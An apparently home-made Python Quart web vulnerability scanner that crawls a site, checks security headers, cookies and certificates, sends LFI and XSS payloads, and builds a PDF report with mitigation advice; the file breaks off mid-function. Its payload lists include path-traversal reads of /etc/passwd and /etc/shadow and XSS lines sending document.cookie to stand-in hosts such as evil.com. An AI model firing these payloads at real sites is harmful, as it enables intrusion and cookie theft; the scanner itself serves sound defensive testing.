from quart import Quart, render_template, request, send_from_directory, jsonify
import aiohttp
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from fpdf import FPDF
import os
from datetime import datetime
import matplotlib.pyplot as plt
import asyncio
from concurrent.futures import ThreadPoolExecutor
import ssl
from aiohttp import ClientSession, ClientConnectorCertificateError
from html import unescape
import html
from urllib.parse import quote



app = Quart(__name__)

# Web Crawler to extract all internal links from the target website
async def crawl_website(base_url):
    visited_urls = set()
    urls_to_visit = [base_url]
    all_urls = []
    
    async with aiohttp.ClientSession() as session:
        while urls_to_visit:
            current_url = urls_to_visit.pop(0)
            if current_url in visited_urls:
                continue

            visited_urls.add(current_url)
            all_urls.append(current_url)

            try:
                async with session.get(current_url, timeout=10) as response:
                    if response.status != 200:
                        continue

                    soup = BeautifulSoup(await response.text(), 'html.parser')
                    for link in soup.find_all('a', href=True):
                        href = urljoin(base_url, link['href'])
                        parsed_href = urlparse(href)
                        if parsed_href.netloc == urlparse(base_url).netloc and href not in visited_urls:
                            urls_to_visit.append(href)

            except asyncio.TimeoutError:
                print(f"Timeout occurred while crawling {current_url}")
            except Exception as e:
                print(f"Error crawling {current_url}: {str(e)}")

    return all_urls

# Add the extract_form_parameters function here
async def extract_form_parameters(session, url):
    params = set()
    try:
        async with session.get(url) as response:
            soup = BeautifulSoup(await response.text(), 'html.parser')
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all('input')
                for input_tag in inputs:
                    if input_tag.get('name'):
                        params.add(input_tag.get('name'))
    except Exception as e:
        print(f"Error extracting form parameters from {url}: {str(e)}")
    return list(params)

# Define functions for various security checks
async def check_missing_headers(session, url):
    results = []
    try:
        async with session.get(url) as response:
            headers = response.headers
            required_headers = [
                "X-Content-Type-Options",
                "Content-Security-Policy",
                "Referrer-Policy",
                "Strict-Transport-Security"
            ]
            for header in required_headers:
                if header not in headers:
                    if header == "X-Content-Type-Options":
                        results.append(f"Missing HTTP header - {header}.\n"
                                       f"Context: This header prevents browsers from MIME-sniffing the content type. "
                                       f"MIME-sniffing can lead to browsers interpreting files differently than intended, "
                                       f"potentially exposing your site to **cross-site scripting (XSS)** attacks. ")
                                       
                    
                    elif header == "Content-Security-Policy":
                        results.append(f"Missing HTTP header - {header}.\n"
                                       f"Context: **Content-Security-Policy (CSP)** is a powerful tool to mitigate XSS and other injection attacks. "
                                       f"It restricts what content (scripts, styles, etc.) can be loaded and executed on the page. "
                                       f"Without a CSP, attackers may inject malicious JavaScript into your site, potentially stealing sensitive information. ")
                                       

                    elif header == "Referrer-Policy":
                        results.append(f"Missing HTTP header - {header}.\n"
                                       f"Context: This header controls how much referrer information (the previous URL) is shared when navigating between sites. "
                                       f"Without this header, sensitive information (like tokens or internal URLs) may be leaked in the referrer header, "
                                       f"especially when moving from HTTPS to HTTP.")

                    elif header == "Strict-Transport-Security":
                        results.append(f"Missing HTTP header - {header}.\n"
                                       f"Context: **HTTP Strict Transport Security (HSTS)** ensures that browsers only connect to your site via HTTPS. "
                                       f"Without this header, your site may be vulnerable to **man-in-the-middle (MITM)** attacks, as users might accidentally connect over HTTP. "
                                       f"HSTS forces browsers to use HTTPS even if the user enters the HTTP version of your site. ")
                    
    except Exception as e:
        results.append(f"Error checking missing headers: {str(e)}")
    return results



def check_secure_communication(url):
    results = []
    try:
        parsed_url = urlparse(url)
        if parsed_url.scheme != 'https':
            results.append("Insecure communication (HTTP instead of HTTPS).\n"
                           "Context: HTTP communication is not encrypted, making it easy for attackers to intercept sensitive information. "
                           "It is recommended to use HTTPS to encrypt data transmission between the browser and the server.")
        else:
            results.append("Secure communication (HTTPS).\n"
                           "Context: HTTPS ensures that data transmitted between the client and server is encrypted, "
                           "making it difficult for attackers to intercept and manipulate.")
    except Exception as e:
        results.append(f"Error checking secure communication: {str(e)}")
    return results


def check_technologies(url):
    results = []
    try:
        import builtwith
        techs = builtwith.parse(url)
        techs_info = [f"Technology: {tech} - {', '.join(techs[tech])}" for tech in techs]
        results.extend(techs_info)
    except Exception as e:
        results.append(f"Error checking technologies: {str(e)}")
    return results

async def check_server_vulnerabilities(session, url):
    results = []
    try:
        async with session.get(url) as response:
            server = response.headers.get('Server', 'Unknown')
            results.append(f"Server identified: {server}")
    except Exception as e:
        results.append(f"Error checking server vulnerabilities: {str(e)}")
    return results

async def check_client_access_policies(session, url):
    results = []
    try:
        # Check for robots.txt
        async with session.get(url + "/robots.txt") as response:
            if response.status == 200:
                results.append("robots.txt file found.\n"
                               "Context: This file is used to manage how search engines index the site. "
                               "It can specify which parts of the site should not be crawled, but it does not enforce any security restrictions.")
            else:
                results.append("robots.txt file not found.\n"
                               "Context: A missing robots.txt file means there are no directives for search engines, "
                               "which could lead to sensitive areas of the site being indexed unintentionally.")

        # Check for security.txt
        async with session.get(url + "/security.txt") as response:
            if response.status == 200:
                results.append("security.txt file found.\n"
                               "Context: This file is meant to provide information about the security policies of the site. "
                               "It may contain contact information for security-related issues and guidelines for reporting vulnerabilities.")
                # Optional: Read the content of security.txt
                security_content = await response.text()
                results.append(f"Contents of security.txt:\n{security_content}\n")
            else:
                results.append("security.txt file not found.\n"
                               "Context: The absence of this file means that the site does not publicly disclose its security policies or contacts, "
                               "which can make it harder for security researchers to report vulnerabilities.")
                
    except Exception as e:
        results.append(f"Error checking client access policies: {str(e)}")
    
    return results



async def check_untrusted_certificates(session, url):
    results = []
    try:
        parsed_url = urlparse(url)
        
        if parsed_url.scheme == 'https':
            ssl_context = ssl.create_default_context()
            try:
                async with session.get(url, ssl=ssl_context) as response:
                    if response.status == 200:
                        # Extract SSL certificate details if the request is successful
                        cert = response.connection.transport.get_extra_info('sslcontext').getpeercert()
                        if cert:
                            issuer = cert['issuer']
                            expiration = cert['notAfter']  # Expiration date
                            results.append(f"HTTPS connection verified successfully for {url}.\n"
                                           f"Issuer: {issuer}\n"
                                           f"Expiration Date: {expiration}\n"
                                           "Context: The SSL certificate is valid and trusted, ensuring secure communication.")
                        else:
                            results.append(f"HTTPS connection verified, but no SSL certificate details found for {url}.")

            except ClientConnectorCertificateError:
                results.append(f"Untrusted SSL certificate detected for {url}.\n"
                               "Context: An untrusted or self-signed certificate may leave users vulnerable to man-in-the-middle attacks.")
            except Exception as e:
                results.append(f"Error checking certificates for {url}: {str(e)}")
        else:
            results.append("No HTTPS; certificate check not applicable.\n"
                           "Context: Sites using HTTP do not have SSL certificates, making them vulnerable to interception.")
    except Exception as e:
        results.append(f"Error parsing URL for certificates check: {str(e)}")
    
    return results




async def check_http_methods(session, url):
    results = []
    try:
        # Send an OPTIONS request to get the allowed HTTP methods
        async with session.options(url) as response:
            # Get the allowed methods from the response
            methods = response.headers.get('Allow', 'Unknown')
            
            if methods != 'Unknown':
                results.append(f"Allowed HTTP methods: {methods}.\n"
                               "Context: The HTTP methods listed are supported by the server for this resource.\n")
                
                # Identify any potentially risky methods
                risky_methods = {'PUT', 'DELETE', 'TRACE', 'OPTIONS'}
                allowed_methods = set(methods.split(', '))  # Split the allowed methods into a set
                
                risky_found = risky_methods.intersection(allowed_methods)
                if risky_found:
                    results.append(f"Potentially risky methods detected: {', '.join(risky_found)}.\n"
                                   "Context: These methods (e.g., PUT, DELETE) allow modifications to server resources and should only be enabled "
                                   "when necessary. Ensure these methods are appropriately secured with authentication and authorization.")
            else:
                results.append("The server did not provide an Allow header or it is unknown.\n"
                               "Context: The HTTP OPTIONS request typically returns the supported methods. Not providing this information may "
                               "indicate misconfiguration or lack of support for OPTIONS.")
                
    except Exception as e:
        results.append(f"Error checking HTTP methods: {str(e)}")
    
    return results


async def check_directory_listing(session, url):
    results = []
    try:
        async with session.get(url) as response:
            content = await response.text()
            
            # Check for common indicators of directory listing
            if "Index of" in content or "Directory listing for" in content:
                results.append("Directory listing enabled.\n"
                               "Context: Directory listing is enabled on this server, allowing users to see the files and directories. "
                               "This can expose sensitive information and files that should not be publicly accessible.")
            else:
                results.append("Directory listing disabled.\n"
                               "Context: Directory listing is disabled on this server, which is a good security practice. "
                               "This prevents unauthorized users from viewing the contents of directories.")
    except Exception as e:
        results.append(f"Error checking directory listing: {str(e)}")
    
    return results


async def check_cookie_flags(session, url):
    results = []
    try:
        async with session.get(url) as response:
            cookies = response.cookies
            
            if not cookies:
                results.append("No cookies found in the response.\n"
                               "Context: This might be due to the server not setting any cookies for this session, "
                               "which could be a good or bad practice depending on the application.")
                return results
            
            for cookie in cookies:
                # Check for the Secure flag
                if not cookie.has_nonstandard_attr('secure'):
                    results.append(f"Cookie without Secure flag: {cookie.name}.\n"
                                   "Context: The Secure flag ensures that the cookie is only sent over HTTPS. "
                                   "Without this flag, the cookie may be transmitted over unencrypted connections, "
                                   "making it vulnerable to interception.")

                # Check for the HttpOnly flag
                if not cookie.has_nonstandard_attr('httponly'):
                    results.append(f"Cookie without HttpOnly flag: {cookie.name}.\n"
                                   "Context: The HttpOnly flag prevents JavaScript from accessing the cookie, "
                                   "which helps mitigate the risk of Cross-Site Scripting (XSS) attacks.")

                # Optional: Check for SameSite attribute (added for further security)
                same_site = cookie.get('SameSite', 'Not Set')
                if same_site == 'Not Set':
                    results.append(f"Cookie without SameSite attribute: {cookie.name}.\n"
                                   "Context: The SameSite attribute helps mitigate Cross-Site Request Forgery (CSRF) attacks "
                                   "by controlling whether cookies are sent along with cross-site requests. Consider setting "
                                   "it to 'Strict' or 'Lax'.")

    except Exception as e:
        results.append(f"Error checking cookie flags: {str(e)}")
    
    return results


async def check_unsafe_csp(session, url):
    results = []
    try:
        async with session.get(url) as response:
            csp = response.headers.get('Content-Security-Policy', '')
            
            if not csp:
                results.append("No Content Security Policy (CSP) header found.\n"
                               "Context: A missing CSP header means that the site does not have any restrictions on where scripts can be loaded from, "
                               "leaving it vulnerable to XSS and other attacks.")
                return results

            # Check for unsafe directives
            unsafe_found = []
            if "unsafe-inline" in csp:
                unsafe_found.append("unsafe-inline")
            if "unsafe-eval" in csp:
                unsafe_found.append("unsafe-eval")

            if unsafe_found:
                results.append(f"Unsafe CSP settings detected: {', '.join(unsafe_found)}.\n"
                               "Context: These directives allow the execution of inline scripts and the use of `eval()`, which can lead to "
                               "serious security vulnerabilities such as Cross-Site Scripting (XSS) attacks. It is recommended to avoid these settings "
                               "and specify trusted sources for scripts.")
            else:
                results.append("CSP settings appear safe.\n"
                               "Context: The Content Security Policy does not include unsafe directives, which reduces the risk of XSS attacks "
                               "and improves overall security.")

    except Exception as e:
        results.append(f"Error checking Content Security Policy: {str(e)}")
    
    return results

async def check_advanced_lfi_vulnerabilities(session, url):
    results = []
    lfi_payloads = [
        "../../../../etc/passwd",
        "../../../etc/passwd",
        "../../../../proc/self/environ",
        "/etc/passwd",
        "/proc/self/environ",
        "../../../../../etc/passwd%00",
        "../../../../etc/passwd%00",
        ".././/.././/.././/.././/etc/passwd",
        "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../../../etc/passwd%00.html",
        "/../../../../etc/passwd%00.html",
        "/../../../../etc/passwd%00.jpg",
        "/../../../../etc/passwd%00.txt",
        "/../../../../etc/passwd%00.json",
        "/../../../../etc/passwd%00.png",
        "/../../../../../../../../../../../../../../etc/passwd",
        "/../../../../../../../../../../../../../../etc/shadow",
        "/../../../../../../../../../../../../../../proc/self/environ",
        "/../../../../../../../../../../../../../../etc/issue",
        "/../../../../../../../../../../../../../../etc/group"
    ]
    for payload in lfi_payloads:
        try:
            async with session.get(f"{url}?file={payload}") as response:
                text = await response.text()
                if "root:" in text or "bin:" in text:
                    results.append(f"Possible LFI vulnerability detected with payload: {payload}")
                else:
                    results.append(f"LFI check passed with payload: {payload}")
        except Exception as e:
            results.append(f"Error checking LFI vulnerabilities: {str(e)}")
    return results

# Run all XSS tests concurrently
async def run_xss_tests(session, url, xss_payloads):
   xss_payloads = [
    # Original payloads
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert('XSS')>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<input type='text' value=''><img src='x' onerror='alert(1)'>",
    "<script>document.body.innerHTML='<h1>XSS</h1>'</script>",
    "<img src=x onerror='this.onerror=null;alert(\"XSS\")'>",

    # PayloadBox payloads
    "<iframe onLoad='javascript:alert(1)'></iframe>",
    "<body onMouseEnter='javascript:alert(1)'></body>",
    "<body onFocus='javascript:alert(1)'></body>",
    "<frameset onScroll='javascript:alert(1)'></frameset>",
    "<script onReadyStateChange='javascript:alert(1)'></script>",
    "<html onMouseUp='javascript:alert(1)'></html>",
    "<body onPropertyChange='javascript:alert(1)'></body>",
    "<svg onLoad='javascript:alert(1)'></svg>",
    "<body onPageHide='javascript:alert(1)'></body>",
    "<style onLoad='javascript:alert(1)'></style>",
    "<bgsound onPropertyChange='javascript:alert(1)'></bgsound>",
    "<html onMouseLeave='javascript:alert(1)'></html>",
    "<html onMouseWheel='javascript:alert(1)'></html>",
    "<iframe onReadyStateChange='javascript:alert(1)'></iframe>",
    "<marquee onStart='javascript:alert(1)'></marquee>",
    "<img src='xxx:x' onerror='alert(1)'>",
    "<svg onLoad='javascript:alert(1)'></svg>",
    "<html onMouseEnter='parent.alert(1)'></html>",
    "<script>/* */alert(1)//</script>",
    "<a href='javascript:alert(1)'>test</a>",
    "<object onError='alert(1)'></object>",
    '"`><script>alert(1)</script>',

    # Advanced payloads
    "<script>alert(document.cookie)</script>",
    "<script>window['alert']('XSS')</script>",
    "<img src=x:alert(1) onerror=alert(1)>",
    "<math><mtext></mtext><script>alert(1)</script></math>",
    "<video><source onerror=alert(1)></video>",
    "<img src=invalid-image onerror=window >",
    "<img src=invalid-image onerror=fetch('https://evil.com/'+document.cookie)>",
    "<input autofocus onfocus=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<body background='javascript:alert(1)'>",
    "<base href='javascript:alert(1)//'>",
    "<form><button formaction='javascript:alert(1)'>CLICK</button></form>",
    "<script src=//evil.com></script>",
    "<img src=x onerror=eval('alert(1)')>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<link rel='stylesheet' href='javascript:alert(1)'>",
    "<object data='javascript:alert(1)'></object>",
    "<details open ontoggle=alert(1)>",
    "<script src='data:text/javascript,alert(1)'></script>",
    "<input type=text value='<iframe src=javascript:alert(1)>'>",
    "<embed src=javascript:alert(1)>",
    "<object type='text/html' data='javascript:alert(1)'></object>",
    "<script>';alert(1);'</script>",
    "<button onmouseover='alert(1)'>Hover me!</button>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<audio src=x onerror=alert(1)>",
    "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",

    # Additional payloads from PayloadBox
    "<input type='button' onclick='alert(1)' value='Click me'>",
    "<div style='xss:expression(alert(1))'></div>",
    "<svg><desc><![CDATA[><img src=1 onerror=alert(1)>]]></desc>",
    "<iframe src='data:text/html,<script>alert(1)</script>'>",
    "<math><mi><script>alert(1)</script></mi></math>",
    "<img src=x:alert(1) onerror=alert(document.domain)>",
    "<input type=image src=x onerror=alert(1)>",
    "<script src='http://yourmalicioussite.com/exploit.js'></script>",
    "';!--\"<XSS>=&{()}",
    "<input onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus></textarea>",
    "<select onfocus=alert(1) autofocus></select>",
    "<img src=x onerror=fetch('http://malicious-site.com/'+document.cookie)>",
    "<object data=javascript:alert(1)>",
    "<meta charset=shift_jis><title>=&#12316;&#12619;&#</title>"
    ]
   
   tasks = []
   tasks.append(test_payload_in_get_and_post(session, url, xss_payloads))
   tasks.append(check_stored_xss(session, url, xss_payloads))
   tasks.append(check_xss_in_headers(session, url, xss_payloads))
   tasks.append(check_encoded_xss_responses(session, url, xss_payloads))

    # Run all tasks concurrently
   results = await asyncio.gather(*tasks)
    
    # Flatten the list of results
   return [item for sublist in results for item in sublist]


# Asynchronous GET/POST request for XSS checks with payloads
async def test_payload_in_get_and_post(session, url, xss_payloads, retries=3):
    results = []
    tasks = []
    
    for payload in xss_payloads:
        encoded_payload = quote(payload)  # URL encode the payload
        tasks.append(check_xss_payload(session, url, payload, "GET", retries))
        tasks.append(check_xss_payload(session, url, payload, "POST", retries))
        tasks.append(check_xss_payload(session, url, encoded_payload, "GET", retries))  # Test encoded version
        tasks.append(check_xss_payload(session, url, encoded_payload, "POST", retries)) 
        
    # Run both GET and POST tests in parallel
    responses = await asyncio.gather(*tasks)
    results.extend(responses)
    
    return results


# Perform actual GET/POST request and check response
async def check_xss_payload(session, url, payload, method, retries):
    try:
        if method == "GET":
            async with session.get(url, params={"q": payload}) as response:
                text = await response.text()
        else:
            async with session.post(url, data={"q": payload}) as response:
                text = await response.text()
        
        # Check if the payload or any suspicious script is in the response
        if payload in text or "alert" in text:
            return f"Possible XSS vulnerability detected with payload: {payload} in {method} parameter"
        return f"XSS check passed with payload: {payload} in {method} parameter"
    except Exception as e:
        if retries > 0:
            return await check_xss_payload(session, url, payload, method, retries - 1)
        return f"Error checking XSS with {method} parameters: {str(e)}"


# Run encoded XSS checks
async def check_encoded_xss_responses(session, url, xss_payloads, retries=3):
    tasks = []
    results = []

    for payload in xss_payloads:
        encoded_payload = quote(payload)  # URL encode the payload
        tasks.append(perform_encoded_xss_check(session, url, payload, retries))
        tasks.append(perform_encoded_xss_check(session, url, encoded_payload, retries))  # Test encoded version
    
    responses = await asyncio.gather(*tasks)
    results.extend(responses)
    
    return results


async def perform_encoded_xss_check(session, url, payload, retries):
    try:
        async with session.get(url, params={"q": payload}) as response:
            response_content = html.unescape(await response.text())
            if "&lt;script&gt;alert" in response_content or "&lt;img" in response_content:
                return f"Possible XSS detected in encoded form with payload: {payload}"
            if payload in response_content or "alert" in response_content:
                return f"Possible reflected XSS detected with payload: {payload}"
        return f"XSS check passed with payload: {payload} (encoded check)"
    except Exception as e:
        if retries > 0:
            return await perform_encoded_xss_check(session, url, payload, retries - 1)
        return f"Error during encoded XSS check with payload: {str(e)}"


# Run XSS checks in headers
async def check_xss_in_headers(session, url, xss_payloads, retries=3):
    tasks = []
    results = []

    for payload in xss_payloads:
        tasks.append(check_header_payload(session, url, payload, retries))

    responses = await asyncio.gather(*tasks)
    results.extend(responses)
    
    return results


async def check_header_payload(session, url, payload, retries):
    try:
        headers = {"User-Agent": payload}
        async with session.get(url, headers=headers) as response:
            text = await response.text()
            if payload in text or "alert" in text:
                return f"Possible XSS detected via User-Agent header with payload: {payload}"
        return f"XSS check passed with payload: {payload} in header"
    except Exception as e:
        if retries > 0:
            return await check_header_payload(session, url, payload, retries - 1)
        return f"Error checking XSS in headers: {str(e)}"


# Function to check for stored XSS
async def check_stored_xss(session, url, xss_payloads, retries=3):
    results = []
    try:
        async with session.get(url) as initial_response:
            soup = BeautifulSoup(await initial_response.text(), 'html.parser')
            for payload in xss_payloads:
                await session.post(url, data={"q": payload})  # Submit payload
                async with session.get(url) as subsequent_response:
                    text = await subsequent_response.text()
                    if payload in text:
                        results.append(f"Possible stored XSS vulnerability detected with payload: {payload}")
                    else:
                        results.append(f"Stored XSS check passed with payload: {payload}")
    except Exception as e:
        if retries > 0:
            return await check_stored_xss(session, url, xss_payloads, retries - 1)
        results.append(f"Error checking for stored XSS vulnerabilities: {str(e)}")

    return results  # Return results even if empty


async def scan_url(session, url):
    """Scan a single URL with various security checks."""
    results = []
    results.extend(await check_missing_headers(session, url))
    results.extend(check_secure_communication(url))
    results.extend(check_technologies(url))
    results.extend(await check_server_vulnerabilities(session, url))
    results.extend(await check_client_access_policies(session, url))
    results.extend(await check_untrusted_certificates(session, url))
    results.extend(await check_http_methods(session, url))
    results.extend(await check_directory_listing(session, url))
    results.extend(await check_cookie_flags(session, url))
    results.extend(await check_unsafe_csp(session, url))
    results.extend(await check_advanced_lfi_vulnerabilities(session, url))
    results.extend(await run_xss_tests(session, url, []))  # You can pass xss_payloads if needed
    
    return results

# Finally, define scan_with_async to handle multiple URLs
async def scan_with_async(crawled_urls):
    """Scan all URLs asynchronously."""
    all_results = []
    
    async with aiohttp.ClientSession() as session:
        tasks = [scan_url(session, url) for url in crawled_urls]
        
        # Await the results from all tasks
        results = await asyncio.gather(*tasks)
        
        # Flatten the list of lists
        for result in results:
            all_results.extend(result)
            
    return all_results


class PDFReport(FPDF):
    def header(self):
        pass

    def footer(self):
        self.set_y(-15)
        self.set_font("Arial", 'I', 8)
        self.cell(0, 10, f'Page {self.page_no()}', 0, 0, 'C')

async def process_url(session, url):
    results = []
    results.extend(await check_missing_headers(session, url))
    results.extend(check_secure_communication(url))
    results.extend(check_technologies(url))
    results.extend(await check_server_vulnerabilities(session, url))
    results.extend(await check_client_access_policies(session, url))
    results.extend(await check_untrusted_certificates(session, url))
    results.extend(await check_http_methods(session, url))
    results.extend(await check_directory_listing(session, url))
    results.extend(await check_cookie_flags(session, url))
    results.extend(await check_unsafe_csp(session, url))
    results.extend(await check_advanced_lfi_vulnerabilities(session, url))
    results.extend(await run_xss_tests(session, url))
    return results


def generate_report_in_thread(url, results, crawled_urls, start_time, end_time, scan_duration):
    try:
        downloads_path = os.path.join(os.path.expanduser("~\Downloads"))
        report_path = os.path.join(downloads_path, 'scan_report.pdf')

        # Log the path to ensure it's correct
        print(f"Report path: {report_path}")

        pdf = PDFReport()
        pdf.set_auto_page_break(auto=True, margin=15)

        # Cover Page
        pdf.add_page()
        pdf.set_font("Arial", 'B', 24)
        pdf.cell(200, 20, txt="Web Vulnerability Scan Report", ln=True, align='C')
        pdf.ln(10)
        pdf.set_font("Arial", size=16)
        pdf.cell(200, 10, txt=f"URL Scanned: {url}", ln=True, align='C')
        pdf.ln(10)
        pdf.cell(200, 10, txt=f"Date: {datetime.now().strftime('%Y-%m-%d')}", ln=True, align='C')
        pdf.ln(20)

          # Add the logo (adjust x, y, and w as needed)
        logo_path = r"C:\Users\User\OneDrive\Desktop\webscanner 3\logo.png"  # Full path with raw string to handle spaces and backslashes
        pdf.image(logo_path, x=10, y=8, w=30)  # Adjust 'x', 'y', and 'w' as needed


        # Format scan duration (remove milliseconds)
        formatted_duration = str(scan_duration).split('.')[0]

        # Add start time, end time, and duration
        pdf.set_font("Arial", size=12)
        pdf.cell(200, 10, txt=f"Scan Start Time: {start_time.strftime('%Y-%m-%d %H:%M:%S')}", ln=True, align='C')
        pdf.cell(200, 10, txt=f"Scan End Time: {end_time.strftime('%Y-%m-%d %H:%M:%S')}", ln=True, align='C')
        pdf.cell(200, 10, txt=f"Scan Duration: {formatted_duration}", ln=True, align='C')
        pdf.ln(20)

        pdf.set_font("Arial", size=12)
        pdf.multi_cell(200, 10, txt="This report provides a comprehensive analysis of the security features of the specified website, highlighting potential vulnerabilities and areas of improvement.", align="L")
        pdf.ln(20)

        # List of Crawled URLs Section
        pdf.add_page()
        pdf.set_font("Arial", 'B', 16)
        pdf.cell(200, 10, txt="List of Crawled URLs", ln=True, align='L')
        pdf.ln(10)
        pdf.set_font("Arial", size=10)
        for crawled_url in crawled_urls:
            pdf.cell(200, 8, txt=crawled_url, ln=True, align='L')

        pdf.ln(10)

        # Generate and Insert Pie Chart
        passed = sum(1 for result in results if "passed" in result.lower())
        failed = len(results) - passed
        chart_path = os.path.join(downloads_path, 'chart.png')
        labels = ['Passed', 'Failed']
        sizes = [passed, failed]
        colors = ['#4CAF50', '#F44336']
        plt.figure(figsize=(5, 5))
        plt.pie(sizes, labels=labels, colors=colors, autopct='%1.1f%%', startangle=140)
        plt.axis('equal')  # Equal aspect ratio ensures that pie is drawn as a circle.
        plt.title('Scan Results Overview')
        plt.savefig(chart_path)
        plt.close()

        pdf.image(chart_path, x=60, y=pdf.get_y(), w=90)
        pdf.ln(80)

        # Table of Contents
        pdf.add_page()
        pdf.set_font("Arial", 'B', 16)
        pdf.cell(200, 10, txt="Table of Contents", ln=True, align='L')
        pdf.set_font("Arial", size=12)

        toc_entries = [
            "Missing HTTP Headers",
            "Secure Communication",
            "Website Technologies",
            "Server Vulnerabilities",
            "Client Access Policies",
            "Untrusted Certificates",
            "HTTP Methods",
            "Directory Listing",
            "Cookie Flags",
            "Unsafe CSP",
            "LFI Vulnerabilities",
            "XSS Vulnerabilities"
        ]

        # Add Table of Contents Entries
        for i, section in enumerate(toc_entries, start=1):
            pdf.cell(0, 10, f"{i}. {section}", ln=True, align='L')
        pdf.ln(10)

        # Define sections and their corresponding content
        sections = {
            "Missing HTTP Headers": [],
            "Secure Communication": [],
            "Website Technologies": [],
            "Server Vulnerabilities": [],
            "Client Access Policies": [],
            "Untrusted Certificates": [],
            "HTTP Methods": [],
            "Directory Listing": [],
            "Cookie Flags": [],
            "Unsafe CSP": [],
            "LFI Vulnerabilities": [],
            "XSS Vulnerabilities": []
        }

        # Populate sections with relevant results
        for result in results:
            if "Missing HTTP header" in result:
                sections["Missing HTTP Headers"].append(result)
            elif "Insecure communication" in result or "Secure communication" in result:
                sections["Secure Communication"].append(result)
            elif "Technology" in result:
                sections["Website Technologies"].append(result)
            elif "Server identified" in result:
                sections["Server Vulnerabilities"].append(result)
            elif "robots.txt" in result or "security.txt" in result:
                sections["Client Access Policies"].append(result)
            elif "Certificate check" in result:
                sections["Untrusted Certificates"].append(result)
            elif "Allowed HTTP methods" in result:
                sections["HTTP Methods"].append(result)
            elif "Directory listing" in result:
                sections["Directory Listing"].append(result)
            elif "Cookie without" in result:
                sections["Cookie Flags"].append(result)
            elif "CSP" in result:
                sections["Unsafe CSP"].append(result)
            elif "LFI" in result:
                sections["LFI Vulnerabilities"].append(result)
            else:
                sections["XSS Vulnerabilities"].append(result)

        # Check if LFI or XSS vulnerabilities are present
        lfi_vulnerable = any("Possible LFI vulnerability" in result for result in sections["LFI Vulnerabilities"])
        xss_vulnerable = any("Possible XSS vulnerability" in result for result in sections["XSS Vulnerabilities"])

        # Mitigation plans for each section
        mitigation_plans = {
            "Missing HTTP Headers": "Ensure the inclusion of security headers like X-Content-Type-Options, Content-Security-Policy, Referrer-Policy, and Strict-Transport-Security in the HTTP responses. This can be done by configuring your web server to add these headers.",
            "Secure Communication": "Always use HTTPS to ensure secure communication. Obtain and configure an SSL/TLS certificate for your domain.",
            "Website Technologies": "Regularly update and patch the technologies used on your website to prevent vulnerabilities. Avoid using outdated or unsupported software.",
            "Server Vulnerabilities": "Ensure that your server software is up-to-date and properly configured. Disable unnecessary services and use firewalls to protect your server.",
            "Client Access Policies": "Implement proper access control by configuring robots.txt and security.txt files correctly. Ensure that sensitive files are not accessible to unauthorized users.",
            "Untrusted Certificates": "Use a trusted SSL/TLS certificate authority to issue certificates. Avoid self-signed certificates for public-facing services.",
            "HTTP Methods": "Restrict the allowed HTTP methods to only those necessary for your application. Disable methods like PUT, DELETE, TRACE, and OPTIONS if not needed.",
            "Directory Listing": "Disable directory listing on your web server to prevent unauthorized users from viewing the contents of directories.",
            "Cookie Flags": "Set the Secure and HttpOnly flags on cookies to enhance security. Secure cookies should only be sent over HTTPS, and HttpOnly cookies are inaccessible via JavaScript.",
            "Unsafe CSP": "Configure Content-Security-Policy to avoid the use of 'unsafe-inline' and 'unsafe-eval'. Specify the sources of scripts, styles, and other resources explicitly.",
            "LFI Vulnerabilities": "Sanitize and validate all user inputs to prevent Local File Inclusion attacks. Avoid directly using user-supplied input in file paths.",
            "XSS Vulnerabilities": "Sanitize and encode user input to prevent Cross-Site Scripting (XSS) attacks. Implement Content Security Policy (CSP) to further protect against XSS."
        }

        # Add sections and results with mitigation plans and vulnerability status for LFI and XSS
        for section, items in sections.items():
            pdf.add_page()
            pdf.set_font("Arial", 'B', 16)
            pdf.cell(200, 10, txt=section, ln=True, align='L')
            pdf.ln(5)
            pdf.set_font("Arial", size=12)
            if not items:
                pdf.multi_cell(200, 10, txt="No issues detected", align="L")
            else:
                pdf.set_font("Arial", size=10)
                for item in items:
                    pdf.multi_cell(200, 8, txt=f"- {item}", align="L")
            pdf.ln(10)

            # Add the vulnerability status for LFI and XSS
            if section == "LFI Vulnerabilities":
                pdf.set_font("Arial", 'B', 12)
                vulnerability_status = "Vulnerable" if lfi_vulnerable else "Not Vulnerable"
                pdf.cell(200, 10, txt=f"Vulnerability Status: {vulnerability_status}", ln=True, align='L')
                pdf.ln(5)

            if section == "XSS Vulnerabilities":
                pdf.set_font("Arial", 'B', 12)
                vulnerability_status = "Vulnerable" if xss_vulnerable else "Not Vulnerable"
                pdf.cell(200, 10, txt=f"Vulnerability Status: {vulnerability_status}", ln=True, align='L')
                pdf.ln(5)

            # Add the mitigation plan
            if section in mitigation_plans:
                pdf.set_font("Arial", 'B', 12)
                pdf.cell(200, 10, txt="Mitigation Plan:", ln=True, align='L')
                pdf.set_font("Arial", size=10)
                pdf.multi_cell(200, 8, txt=mitigation_plans[section], align="L")
                pdf.ln(10)

        # Footer
        pdf.set_y(-15)
        pdf.set_font("Arial", 'I', size=8)
        pdf.cell(0, 10, 'Page %s' % pdf.page_no(), 0, 0, 'C')

        # Save the PDF
        pdf.output(report_path)

        # Clean up the chart image
        if os.path.exists(chart_path):
            os.remove(chart_path)

        pdf.output(report_path)
        print(f"PDF successfully generated at {report_path}")

        return 'scan_report.pdf'
    except Exception as e:
        print(f"Error generating report: {str(e)}")
        return None
    



async def generate_report_async(url, results, crawled_urls, start_time, end_time, scan_duration):
    try:
        loop = asyncio.get_running_loop()
        with ThreadPoolExecutor() as pool:
